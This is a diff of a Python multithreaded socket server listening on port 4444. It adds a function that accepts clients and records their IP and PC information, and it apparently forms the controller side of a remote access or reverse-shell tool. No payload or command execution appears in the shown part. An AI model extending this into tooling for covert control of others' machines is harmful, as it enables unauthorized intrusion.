@@ -10,31 +10,26 @@ End Developing Date:
 
 # Step 0: Import requires libraries
 
+from queue import Queue
 # import socket
 from socket import socket, SOL_SOCKET, SO_REUSEADDR, error as SocketError
-import os
-from queue import Queue
-from time import sleep
-import threading
-from sys import exit
-
 
 """ Section 1: Develop Utitlity Objects(Global Variables, lambda's, functions) """
 
 # Step 2: Define Global Variables
 
-intThreads = 2      # Thread's Number in Multithreading
-arrJobs = [1, 2]    # Use for Multithreading, Store Total Jobs
+intThreads = 2  # Thread's Number in Multithreading
+arrJobs = [1, 2]  # Use for Multithreading, Store Total Jobs
 
-queue = Queue()     # Used for Handling Jobs in Multithreading
+queue = Queue()  # Used for Handling Jobs in Multithreading
 
-arrAddresses = []       # Store All Socket Connection Addresses
-arrConnections = []     # Store All Connection Information about Socket Connections
+arrAddresses = []  # Store All Socket Connection Addresses
+arrConnections = []  # Store All Connection Information about Socket Connections
 
-strHost = "192.168.10.100"      # Server IP Address
-intPort = 4444                  # Server Port
+strHost = "192.168.10.100"  # Server IP Address
+intPort = 4444  # Server Port
 
-intBuff = 1024      # Maximum Size(Bytes) of Data to Receive as
+intBuffer = 1024  # Maximum Size(Bytes) of Data to Receive as
 
 # objSocket = None      # Socket Object
 
@@ -64,6 +59,7 @@ def recvall(buffer):
         if len(bytesData) == buffer:
             return bytesData
 
+
 # Step 5: Define a Function to Create Socket Connection
 def create_socket():
     global objSocket
@@ -77,10 +73,10 @@ def create_socket():
 
 # Step 6: Define a Function to Bind Socket
 def socket_bind():
-    global objSocket # noqa
+    global objSocket  # noqa
     try:
         print(f"[+] Listening on Port: {str(intPort)}")
-        objSocket.bind((strHost, intPort)) # noqa
+        objSocket.bind((strHost, intPort))  # noqa
         objSocket.listen(20)
 
     except SocketError as e:
@@ -88,11 +84,28 @@ def socket_bind():
         socket_bind()
 
 
+# Step 7: Define Function to Accept Socket
+def socket_accept():
+    while True:
+        try:
+            conn, address = objSocket.accept()
 
+            # Set no timeout blocking
+            conn.setblocking(1)  # noqa
 
+            # Append Connection to arrConnections
+            arrConnections.append(conn)
 
+            # Get Client info and add it to address
+            clientInfo = decode_utf(conn.recv(intBuffer)).split("',")
+            address += clientInfo[0], clientInfo[1], clientInfo[2]
 
+            # Append address to arrAddresses
+            arrAddresses.append(address)
 
+            # address[0] is IP Address, address[2] is Client PC Information
+            print(f"\n[+] Connection has been Established Succesfully: {address[0]} ({address[2]})")
 
-
-
+        except SocketError as e:
+            print(f'[-] Error while Accepting Connection. \n[-] Error: {e}')
+            continue
